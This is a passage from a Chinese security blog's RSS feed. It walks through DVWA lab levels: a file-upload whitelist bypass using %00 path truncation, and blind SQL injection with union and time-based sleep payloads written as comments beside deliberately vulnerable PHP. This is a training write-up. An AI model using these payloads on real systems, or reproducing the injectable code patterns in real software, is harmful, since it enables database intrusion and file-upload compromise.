&lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// 注意这个位置
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 最后拼接的储存路径，是由用户提交上的数据来做为路径
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$img_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;save_path&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">99&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">date&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;YmdHis&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$img_path&lt;/span>&lt;span class="p">)){&lt;/span>
&lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;上传失败&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。&lt;/p>
&lt;p>但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以在路径上做手脚。&lt;/p>
&lt;p>如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。&lt;/p>
&lt;blockquote>
&lt;p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束 (php版本要小于5.3.4，5.3.4及以上已经修复该问题)&lt;/p>
&lt;/blockquote></description></item><item><title>Sql Injection Blind</title><link>https://sdttttt.github.io/blog/sql_injection_blind/</link><pubDate>Fri, 10 Apr 2020 11:11:22 +0800</pubDate><guid>https://sdttttt.github.io/blog/sql_injection_blind/</guid><description>
&lt;p>返回的结果集无法看到，只能通过一些页面显示或状态来判断。
像瞎子一样。&lt;/p>
&lt;p>DVWA SQL Injection blind 过关秘籍.&lt;/p>
&lt;h3 id="low">Low&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$getid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 没有一点点防备
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 尝试构造: (由于看不到结果集，所以脱裤子的语句是无效)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,2 # &amp;#39;;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// User ID exists in the database. &amp;lt;存在注入漏洞&amp;gt;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,if(length( database())=4,sleep(4),2) # &amp;#39;;
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$getid&lt;/span> &lt;span class="p">);&lt;/span> &lt;span class="c1">// Removed &amp;#39;or die&amp;#39; to suppress mysql errors
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span> &lt;span class="c1">// The &amp;#39;@&amp;#39; character suppresses errors
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// User wasn&amp;#39;t found, so the page wasn&amp;#39;t!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">header&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39; 404 Not Found&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysql_close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="miedum">MIEDUM&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_real_escape_string&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$getid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 尝试构造:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,2;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 以上判断存在注入漏洞
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = 0 union select 1,if(length(database()) &amp;gt; 4, sleep(3), 2)
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$getid&lt;/span> &lt;span class="p">);&lt;/span> &lt;span class="c1">// Removed &amp;#39;or die&amp;#39; to suppress mysql errors
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span> &lt;span class="c1">// The &amp;#39;@&amp;#39; character suppresses errors
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">//mysql_close();
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high">High&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39; LIMIT 1;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// 没有新花样，只限制输出条目是无法拦住我们的
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 尝试构造:
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;0&amp;#39; union select 1,if(length(database()) = 4, sleep(3), 2) # LIMIT 1;
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_query&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_numrows&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nv">$num&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysql_result&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Increase loop count
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">mysql_close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high-1">High&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Check Anti-CSRF token
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">checkToken&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;user_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;session_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="s1">&amp;#39;index.php&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Was a number entered?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is_numeric&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Check the database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// PDO 无法注入
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$db&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">prepare&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">bindParam&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;:id&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$id&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">PDO&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">PARAM_INT&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">execute&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$data&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">rowCount&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID exists in the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// User wasn&amp;#39;t found, so the page wasn&amp;#39;t!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">header&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;SERVER_PROTOCOL&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39; 404 Not Found&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;User ID is MISSING from the database.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Generate Anti-CSRF token
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">generateSessionToken&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>SQL Injection</title><link>https://sdttttt.github.io/blog/sql_injection/</link><pubDate>Fri, 10 Apr 2020 10:54:47 +0800</pubDate><guid>https://sdttttt.github.io/blog/sql_injection/</guid><description>
&lt;p>DVWA SQL Injection 过关秘籍.&lt;/p>
&lt;h3 id="low">LOW&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
